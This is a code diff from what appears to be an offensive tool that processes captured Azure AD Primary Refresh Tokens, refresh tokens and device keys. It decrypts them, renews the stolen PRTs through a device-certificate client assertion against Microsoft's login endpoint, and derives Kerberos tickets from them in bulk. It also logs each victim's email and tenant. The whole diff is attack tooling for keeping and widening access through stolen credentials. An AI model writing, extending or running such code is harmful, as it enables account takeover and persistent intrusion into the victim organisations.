@@ -14,6 +14,7 @@ const ms = require('./microsoftclient');
 const { decrypt, encrypt } = require('../utils/encrypt');
 const db = require('../database/connection');
 const config = require('../config/env');
+const { buildClientAssertion, getPrtCookie } = require('./devicemanager');
 
 /**
  * Safely decode the JWT payload of a PRT without verifying the signature.
@@ -380,7 +381,7 @@ async function bulkDeriveTGTs(limit = 50) {
         const refreshToken = decrypt(token.refresh_token_encrypted);
         const sessionKeyJwe = decrypt(token.session_key_jwe);
         const tenant = token.tenant || config.AZURE_TENANT || 'common';
-        const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
+        const clientId = token.client_id || config.AZURE_CLIENT_ID;
 
         // Skip if no PRT or invalid tenant
         if (!prt || !token.prt || tenant === 'common' || tenant === 'organizations') {
@@ -480,9 +481,34 @@ async function deriveTGTForToken(tokenId) {
     const refreshToken = decrypt(token.refresh_token_encrypted);
     const sessionKeyJwe = decrypt(token.session_key_jwe);
     const tenant = token.tenant || config.AZURE_TENANT || 'common';
-    const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
+    const clientId = token.client_id || config.AZURE_CLIENT_ID;
 
-    if (!prt) {
+    // Device-certificate renewal path for Broker-enrolled captures
+    let renewedPrt = null;
+    if (token.device_enrolled && token.encrypted_private_key && token.device_certificate_encrypted) {
+      try {
+        const deviceCertificate = decrypt(token.device_certificate_encrypted);
+        const privateKeyPem = decrypt(token.encrypted_private_key);
+        const clientAssertion = buildClientAssertion(
+          privateKeyPem,
+          token.device_id,
+          `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
+          deviceCertificate,
+          null,
+          null
+        );
+        const refreshOrPrt = refreshToken || prt;
+        if (refreshOrPrt) {
+          renewedPrt = await getPrtCookie(clientAssertion, refreshOrPrt, tenant);
+          console.log('[Kerberos] Refreshed PRT via device certificate for token', token.id);
+        }
+      } catch (renewErr) {
+        console.error('[Kerberos] Device certificate renewal failed:', renewErr.message);
+      }
+    }
+
+    const effectivePrt = renewedPrt || prt;
+    if (!effectivePrt) {
       return { success: false, error: 'No PRT found for this token' };
     }
 
@@ -491,16 +517,16 @@ async function deriveTGTForToken(tokenId) {
     }
 
     // Diagnostic: log what's actually in the stored PRT so failures are explainable
-    const prtClaims = parsePrtClaims(prt);
+    const prtClaims = parsePrtClaims(effectivePrt);
     console.log('[Kerberos] Deriving TGTs for token', token.id, 'email', token.email, 'tenant', tenant,
-      '| prtPrefix:', (prt || '').substring(0, 16),
+      '| prtPrefix:', (effectivePrt || '').substring(0, 16),
       '| prtParsed:', !!prtClaims,
       '| acrs:', prtClaims && Array.isArray(prtClaims.acrs) ? prtClaims.acrs : null,
       '| prt.tid:', prtClaims && prtClaims.tid || null);
 
     // Derive TGTs
     const derivationResult = await deriveKerberosTGTs(
-      prt,
+      effectivePrt,
       refreshToken,
       tenant,
       clientId,
